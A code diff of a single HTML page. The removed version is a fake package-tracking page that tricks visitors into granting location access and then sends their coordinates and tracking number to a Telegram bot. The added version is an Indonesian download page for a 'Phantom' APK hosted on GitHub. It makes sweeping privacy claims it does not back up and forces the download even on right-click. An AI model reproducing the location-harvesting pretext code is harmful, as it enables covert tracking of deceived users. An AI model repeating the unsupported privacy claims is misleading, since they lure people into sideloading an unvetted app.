@@ -1,129 +1,465 @@
-!DOCTYPE html>
-<html>
-  <head>
-    <title>Track Package</title>
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <style>
-      body {
-        background-color: #f8f9fa;
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+  <title>Phantom · Unduh APK</title>
+  <!-- Font & Ikon -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: linear-gradient(145deg, #0e0f14 0%, #1a1c26 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      color: #eef2f9;
+      line-height: 1.5;
+    }
+
+    .card {
+      max-width: 680px;
+      width: 100%;
+      background: rgba(24, 27, 38, 0.8);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 48px;
+      padding: 2.4rem 2rem 2.8rem;
+      box-shadow: 0 25px 50px -8px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.04);
+      transition: all 0.2s ease;
+      border: 1px solid rgba(255, 255, 255, 0.03);
+    }
+
+    /* header */
+    .app-header {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      margin-bottom: 2rem;
+      flex-wrap: wrap;
+    }
+
+    .icon-box {
+      width: 70px;
+      height: 70px;
+      background: linear-gradient(135deg, #7c5cfc, #5b3cc4);
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.2rem;
+      color: white;
+      box-shadow: 0 12px 24px -6px rgba(92, 60, 196, 0.4);
+      flex-shrink: 0;
+    }
+
+    .app-title {
+      flex: 1;
+    }
+
+    .app-title h1 {
+      font-size: 2rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      background: linear-gradient(to right, #f0f3ff, #b7adff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      line-height: 1.2;
+    }
+
+    .app-title .badge {
+      display: inline-block;
+      background: rgba(124, 92, 252, 0.2);
+      backdrop-filter: blur(4px);
+      padding: 0.2rem 0.9rem;
+      border-radius: 40px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      letter-spacing: 0.3px;
+      color: #b7adff;
+      border: 1px solid rgba(124, 92, 252, 0.2);
+      margin-top: 4px;
+    }
+
+    /* fitur utama */
+    .feature-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+      margin: 2rem 0 2.2rem;
+    }
+
+    .feature-item {
+      background: rgba(255, 255, 255, 0.03);
+      backdrop-filter: blur(4px);
+      border-radius: 24px;
+      padding: 1rem 0.8rem;
+      text-align: center;
+      border: 1px solid rgba(255, 255, 255, 0.04);
+      transition: all 0.2s;
+    }
+
+    .feature-item i {
+      font-size: 1.6rem;
+      color: #a990ff;
+      margin-bottom: 6px;
+      display: block;
+    }
+
+    .feature-item span {
+      font-size: 0.8rem;
+      font-weight: 500;
+      color: #d6d9f0;
+      letter-spacing: 0.2px;
+      display: block;
+    }
+
+    .feature-item small {
+      font-size: 0.65rem;
+      color: #8f94b0;
+      display: block;
+      margin-top: 4px;
+      font-weight: 400;
+    }
+
+    /* privasi badge */
+    .privacy-badge {
+      background: rgba(0, 230, 118, 0.06);
+      border: 1px solid rgba(0, 230, 118, 0.12);
+      border-radius: 60px;
+      padding: 0.6rem 1.2rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 0.8rem;
+      font-weight: 500;
+      color: #b3f0d5;
+      margin-bottom: 1.8rem;
+      backdrop-filter: blur(4px);
+      letter-spacing: 0.2px;
+    }
+
+    .privacy-badge i {
+      color: #4cdb9e;
+      font-size: 1rem;
+    }
+
+    /* tombol unduh */
+    .download-section {
+      margin-top: 2rem;
+    }
+
+    .btn-download {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      width: 100%;
+      padding: 1.2rem 1.5rem;
+      background: linear-gradient(135deg, #7c5cfc, #5a3bc9);
+      border: none;
+      border-radius: 80px;
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: white;
+      box-shadow: 0 12px 30px -8px rgba(92, 60, 196, 0.5);
+      transition: all 0.2s ease;
+      cursor: pointer;
+      letter-spacing: 0.3px;
+      position: relative;
+      overflow: hidden;
+      text-decoration: none;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .btn-download i {
+      font-size: 1.6rem;
+      transition: transform 0.2s;
+    }
+
+    .btn-download:hover {
+      transform: scale(1.02);
+      background: linear-gradient(135deg, #8d70ff, #684ad9);
+      box-shadow: 0 16px 36px -8px #4d34b0;
+    }
+
+    .btn-download:active {
+      transform: scale(0.97);
+    }
+
+    .btn-download .ripple {
+      position: absolute;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.2);
+      transform: scale(0);
+      animation: rippleAnim 0.6s linear;
+      pointer-events: none;
+    }
+
+    @keyframes rippleAnim {
+      to {
+        transform: scale(4);
+        opacity: 0;
       }
-      .container {
-        margin-top: 50px;
+    }
+
+    .file-info {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.7rem;
+      color: #7b81a0;
+      margin-top: 1rem;
+      padding: 0 0.2rem;
+      letter-spacing: 0.2px;
+    }
+
+    .file-info span i {
+      margin-right: 4px;
+      color: #7b81a0;
+    }
+
+    /* footer / meta */
+    .footer-meta {
+      margin-top: 2.8rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 0.8rem;
+      font-size: 0.7rem;
+      color: #5f6585;
+      border-top: 1px solid rgba(255, 255, 255, 0.04);
+      padding-top: 1.8rem;
+    }
+
+    .footer-meta .repo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255, 255, 255, 0.02);
+      padding: 0.2rem 1rem 0.2rem 0.8rem;
+      border-radius: 30px;
+      border: 1px solid rgba(255, 255, 255, 0.03);
+    }
+
+    .footer-meta .repo i {
+      color: #7c5cfc;
+    }
+
+    .footer-meta .repo a {
+      color: #b7adff;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .footer-meta .repo a:hover {
+      text-decoration: underline;
+    }
+
+    .version-tag {
+      background: rgba(255, 255, 255, 0.03);
+      padding: 0.2rem 1rem;
+      border-radius: 30px;
+      border: 1px solid rgba(255, 255, 255, 0.03);
+    }
+
+    /* animasi kecil */
+    @keyframes float {
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-4px); }
+      100% { transform: translateY(0px); }
+    }
+
+    .icon-box {
+      animation: float 3s ease-in-out infinite;
+    }
+
+    /* responsive */
+    @media (max-width: 480px) {
+      .card {
+        padding: 1.8rem 1.2rem 2rem;
+        border-radius: 32px;
       }
-      .tracking-card {
-        border-radius: 10px;
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        background-color: #fff;
+
+      .app-title h1 {
+        font-size: 1.6rem;
       }
-      .tracking-card h2 {
-        color: #333;
+
+      .feature-grid {
+        grid-template-columns: 1fr 1fr;
+        gap: 0.8rem;
       }
-      .tracking-card p {
-        color: #666;
+
+      .btn-download {
+        font-size: 1.1rem;
+        padding: 1rem 1rem;
       }
-      .tracking-btn {
-        background-color: #007bff;
-        color: #fff;
-        border: none;
-        border-radius: 5px;
-        padding: 10px 20px;
-        cursor: pointer;
+
+      .privacy-badge {
+        font-size: 0.7rem;
+        padding: 0.4rem 1rem;
       }
-      .tracking-btn:hover {
-        background-color: #0056b3;
+    }
+
+    @media (max-width: 380px) {
+      .feature-grid {
+        grid-template-columns: 1fr;
       }
-      #tracking-modal {
-        display: none;
-        position: fixed;
-        z-index: 1;
-        left: 0;
-        top: 0;
-        width: 100%;
-        height: 100%;
-        overflow: auto;
-        background-color: rgb(0,0,0);
-        background-color: rgba(0,0,0,0.4);
-      }
-      #tracking-modal .modal-content {
-        background-color: #fefefe;
-        margin: 15% auto;
-        padding: 20px;
-        border: 1px solid #888;
-        width: 80%;
-        border-radius: 10px;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="container">
-      <div class="row justify-content-center">
-        <div class="col-md-8">
-          <div class="tracking-card p-4">
-            <h2 class="text-center mb-4">Track Package</h2>
-            <p class="text-center">Enter your tracking number to locate your package in real-time.</p>
-            <div class="form-group">
-              <input type="text" id="tracking-number" class="form-control" placeholder="Enter tracking number" required>
-            </div>
-            <button id="track-btn" class="tracking-btn btn-block mt-3">Track</button>
-          </div>
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <!-- Header -->
+    <div class="app-header">
+      <div class="icon-box">
+        <i class="fas fa-ghost"></i>
+      </div>
+      <div class="app-title">
+        <h1>Phantom</h1>
+        <div class="badge">
+          <i class="fas fa-lock" style="margin-right: 5px;"></i> Privasi · Hemat
         </div>
       </div>
     </div>
 
-    <div id="tracking-modal">
-      <div class="modal-content">
-        <span class="close-button">&times;</span>
-        <h2>Allow Location Access</h2>
-        <p>Please allow this page to access your location to track your package in real-time.</p>
-        <button id="allow-location">Allow Location</button>
+    <!-- Privasi & keamanan -->
+    <div class="privacy-badge">
+      <i class="fas fa-shield-alt"></i>
+      <span>Percakapan terenkripsi · Tidak ada log · Hemat kuota</span>
+      <i class="fas fa-check-circle" style="margin-left: auto; color: #4cdb9e;"></i>
+    </div>
+
+    <!-- Grid fitur -->
+    <div class="feature-grid">
+      <div class="feature-item">
+        <i class="fas fa-comment-dots"></i>
+        <span>Chat Privasi</span>
+        <small>End-to-end encryption</small>
+      </div>
+      <div class="feature-item">
+        <i class="fas fa-wifi-slash"></i>
+        <span>Hemat Kuota</span>
+        <small>Mode data rendah</small>
+      </div>
+      <div class="feature-item">
+        <i class="fas fa-user-secret"></i>
+        <span>Tanpa Identitas</span>
+        <small>No nomor HP / email</small>
+      </div>
+      <div class="feature-item">
+        <i class="fas fa-trash-alt"></i>
+        <span>Pesan Menghilang</span>
+        <small>Privasi maksimal</small>
       </div>
     </div>
 
-    <script>
-      document.getElementById('track-btn').addEventListener('click', function() {
-        const trackingNumber = document.getElementById('tracking-number').value;
-        if (trackingNumber) {
-          showModal();
-        }
-      });
+    <!-- Tombol unduh -->
+    <div class="download-section">
+      <button id="downloadBtn" class="btn-download">
+        <i class="fas fa-download"></i>
+        <span>Unduh Phantom.apk</span>
+        <i class="fas fa-chevron-right" style="font-size: 1rem; opacity: 0.7;"></i>
+      </button>
+      <div class="file-info">
+        <span><i class="fas fa-file"></i> Phantom.apk · 24 MB</span>
+        <span><i class="fas fa-check-circle" style="color: #4cdb9e;"></i> Versi 2.1.0</span>
+      </div>
+    </div>
 
-      document.querySelector('.close-button').addEventListener('click', function() {
-        hideModal();
-      });
+    <!-- Footer dengan repo github -->
+    <div class="footer-meta">
+      <div class="repo">
+        <i class="fab fa-github"></i>
+        <a href="https://github.com/RORA" target="_blank">github.com/RORA</a>
+        <span style="color: #4f5575; margin-left: 4px;">·</span>
+        <span style="color: #6a70a0;">Phantom</span>
+      </div>
+      <div class="version-tag">
+        <i class="fas fa-tag"></i> v2.1.0 · stable
+      </div>
+    </div>
 
-      document.getElementById('allow-location').addEventListener('click', function() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(function(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            sendLocationToTelegram(latitude, longitude);
-            alert('Location sent to Telegram. Tracking your package...');
-            hideModal();
-          });
-        } else {
-          alert('Geolocation is not supported by this browser.');
-        }
-      });
+    <!-- Catatan kecil privasi -->
+    <div style="margin-top: 1.2rem; font-size: 0.6rem; color: #4f5575; text-align: center; border-top: 1px solid rgba(255,255,255,0.02); padding-top: 1rem; letter-spacing: 0.2px;">
+      <i class="fas fa-lock" style="margin-right: 4px;"></i> Keamanan privasi adalah prioritas. Tidak ada data yang disimpan.
+    </div>
+  </div>
 
-      function showModal() {
-        document.getElementById('tracking-modal').style.display = 'block';
+  <script>
+    (function() {
+      const downloadBtn = document.getElementById('downloadBtn');
+
+      // URL langsung ke file APK di repository RORA (Phantom.apk)
+      // Menggunakan raw.githubusercontent.com agar unduhan langsung
+      const APK_URL = 'https://raw.githubusercontent.com/RORA/PhantomByte/main/Phantom.apk';
+
+      // Fungsi efek ripple (opsional)
+      function createRipple(e, btn) {
+        const rect = btn.getBoundingClientRect();
+        const size = Math.max(rect.width, rect.height);
+        const x = e.clientX - rect.left - size / 2;
+        const y = e.clientY - rect.top - size / 2;
+        const ripple = document.createElement('span');
+        ripple.className = 'ripple';
+        ripple.style.width = ripple.style.height = `${size}px`;
+        ripple.style.left = `${x}px`;
+        ripple.style.top = `${y}px`;
+        btn.appendChild(ripple);
+        setTimeout(() => ripple.remove(), 600);
       }
 
-      function hideModal() {
-        document.getElementById('tracking-modal').style.display = 'none';
+      // Handler unduh
+      function handleDownload(e) {
+        // Efek ripple
+        createRipple(e, downloadBtn);
+
+        // Membuat link unduh otomatis
+        const link = document.createElement('a');
+        link.href = APK_URL;
+        link.download = 'Phantom.apk'; // Nama file saat diunduh
+        link.target = '_blank';
+        link.rel = 'noopener noreferrer';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        // Feedback visual (tanpa mengganti teks permanen)
+        const originalHTML = downloadBtn.innerHTML;
+        downloadBtn.innerHTML = `
+          <i class="fas fa-spinner fa-pulse"></i>
+          <span>Mengunduh ...</span>
+        `;
+        downloadBtn.style.opacity = '0.8';
+        setTimeout(() => {
+          downloadBtn.innerHTML = originalHTML;
+          downloadBtn.style.opacity = '1';
+        }, 2200);
       }
 
-      function sendLocationToTelegram(lat, lon) {
-        const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-        const chatId = 'YOUR_CHAT_ID';
-        const url = https://api.telegram.org/bot${botToken}/sendMessage;
-        const msg = Tracking number: ${document.getElementById('tracking-number').value}\nLatitude: ${lat}\nLongitude: ${lon};
-        fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: msg })
-        });
-      }
-    </script>
-  </body>
+      // Event listener
+      downloadBtn.addEventListener('click', handleDownload);
+
+      // Opsional: jika pengguna mengklik kanan / konteks tetap bisa
+      downloadBtn.addEventListener('contextmenu', (e) => {
+        e.preventDefault();
+        handleDownload(e);
+      });
+
+      // Tombol juga support sentuh
+    })();
+  </script>
+</body>
 </html>
